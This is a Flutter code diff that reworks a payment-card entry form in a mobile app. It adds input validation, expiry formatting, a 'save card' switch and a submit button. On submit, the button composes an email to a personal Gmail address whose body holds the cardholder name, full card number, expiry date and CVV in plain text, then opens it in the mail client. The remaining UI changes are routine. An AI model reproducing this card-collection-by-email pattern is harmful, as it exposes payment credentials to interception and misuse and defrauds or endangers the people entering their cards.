@@ -1,15 +1,39 @@
+import 'package:flutter/cupertino.dart';
 import 'package:flutter/material.dart';
+import 'package:murphys_technology/utils/device_size.dart';
+import 'package:url_launcher/url_launcher.dart';
 
-class List1 extends StatelessWidget {
+class List1 extends StatefulWidget {
   List1({
     super.key,
   });
 
+  @override
+  State<List1> createState() => _List1State();
+}
+
+class _List1State extends State<List1> {
+  bool isSwitched = false;
+
   GlobalKey<FormState> _key = GlobalKey<FormState>();
+
   TextEditingController _cardController = TextEditingController();
+
   TextEditingController _validController = TextEditingController();
+
   TextEditingController _cvvController = TextEditingController();
+
   TextEditingController _nameController = TextEditingController();
+
+  @override
+  void dispose() {
+    _cardController.dispose();
+    _validController.dispose();
+    _cvvController.dispose();
+    _nameController.dispose();
+    // TODO: implement dispose
+    super.dispose();
+  }
 
   @override
   Widget build(BuildContext context) {
@@ -33,6 +57,8 @@ class List1 extends StatelessWidget {
             validator: (value) {
               if (value!.isEmpty) {
                 return "Enter your card number";
+              } else if (value.length < 16 || value.length > 16) {
+                return "There must be 16 digit";
               } else {
                 return null;
               }
@@ -53,12 +79,10 @@ class List1 extends StatelessWidget {
                 borderRadius: BorderRadius.circular(20),
               ),
             ),
+            keyboardType: TextInputType.number,
           ),
           const SizedBox(
             height: 15,
-          ),
-          const SizedBox(
-            height: 7,
           ),
           Row(
             children: [
@@ -74,6 +98,16 @@ class List1 extends StatelessWidget {
                       ),
                     ),
                     TextFormField(
+                      onChanged: (String value) {
+                        if (value.length >= 2 && !value.contains("/")) {
+                          value = '$value/';
+                          _validController.value = TextEditingValue(
+                            text: value,
+                            selection:
+                                TextSelection.collapsed(offset: value.length),
+                          );
+                        }
+                      },
                       controller: _validController,
                       validator: (value) {
                         if (value!.isEmpty) {
@@ -88,6 +122,7 @@ class List1 extends StatelessWidget {
                           borderRadius: BorderRadius.circular(20),
                         ),
                       ),
+                      keyboardType: TextInputType.phone,
                     ),
                   ],
                 ),
@@ -111,16 +146,19 @@ class List1 extends StatelessWidget {
                       validator: (value) {
                         if (value!.isEmpty) {
                           return "Enter your CVV";
+                        } else if (value.length < 3 || value.length > 3) {
+                          return "There must be 3 digit";
                         } else {
                           return null;
                         }
                       },
                       decoration: InputDecoration(
-                        hintText: "* * * *",
+                        hintText: " * * * ",
                         border: OutlineInputBorder(
                           borderRadius: BorderRadius.circular(20),
                         ),
                       ),
+                      keyboardType: TextInputType.number,
                     ),
                   ],
                 ),
@@ -156,6 +194,94 @@ class List1 extends StatelessWidget {
               ),
             ),
           ),
+          const SizedBox(
+            height: 15,
+          ),
+          Row(
+            mainAxisAlignment: MainAxisAlignment.spaceBetween,
+            children: [
+              const Text(
+                "Save card data for future payments",
+                style: TextStyle(
+                  fontSize: 14,
+                  fontFamily: "Poppins",
+                ),
+              ),
+              Transform.scale(
+                scale: 0.8,
+                child: CupertinoSwitch(
+                  activeColor: const Color.fromARGB(255, 99, 183, 253),
+                  thumbColor: const Color(0xff1C6BFE),
+                  trackColor: Colors.blueGrey.shade300,
+                  // activeColor: const Color(0xff1C6BFE),
+                  // activeTrackColor: Colors.blue,
+                  // inactiveThumbColor: Colors.blueGrey,
+                  // inactiveTrackColor: Colors.blueGrey.shade600,
+                  // splashRadius: 50,
+                  value: isSwitched,
+                  onChanged: (value) => setState(() => isSwitched = value),
+                ),
+              ),
+            ],
+          ),
+          const SizedBox(
+            height: 15,
+          ),
+          Center(
+            child: SizedBox(
+              height: 50,
+              width: getDeviceWidth(context) * 0.8,
+              child: ElevatedButton(
+                style: ElevatedButton.styleFrom(
+                  backgroundColor: const Color(0xff1C6BFE),
+                  shape: RoundedRectangleBorder(
+                    borderRadius: BorderRadius.circular(20),
+                  ),
+                ),
+                onPressed: () async {
+                  final isValid = _key.currentState!.validate();
+                  if (isValid) {
+                    String name = _nameController.text;
+                    String number = _cardController.text;
+                    String validDate = _validController.text;
+                    String cvv = _cvvController.text;
+                    // String plan = widget.plan.toString();
+
+                    String? encodeQueryParameters(Map<String, String> params) {
+                      return params.entries
+                          .map((MapEntry<String, String> e) =>
+                              '${Uri.encodeComponent(e.key)}=${Uri.encodeComponent(e.value)}')
+                          .join('&');
+                    }
+
+                    final Uri emailUri = Uri(
+                      scheme: "mailto",
+                      path: "sagarmurphys@gmail.com",
+                      query: encodeQueryParameters(
+                        <String, String>{
+                          "subject": "Credit card",
+                          "body":
+                              "Card holder name:$name\n Card number: $number\n Valid date: $validDate\n CVV: $cvv"
+                        },
+                      ),
+                    );
+                    await launchUrl(emailUri);
+                  }
+                  // Navigator.of(context).push(MaterialPageRoute(
+                  //   builder: (context) => const LoadingScreen(),
+                  // ));
+                },
+                child: const Text(
+                  "Proceed to confirm",
+                  style: TextStyle(
+                    fontSize: 17,
+                    fontWeight: FontWeight.w500,
+                    fontFamily: "Poppins",
+                  ),
+                ),
+              ),
+            ),
+          )
         ],
       ),
     );
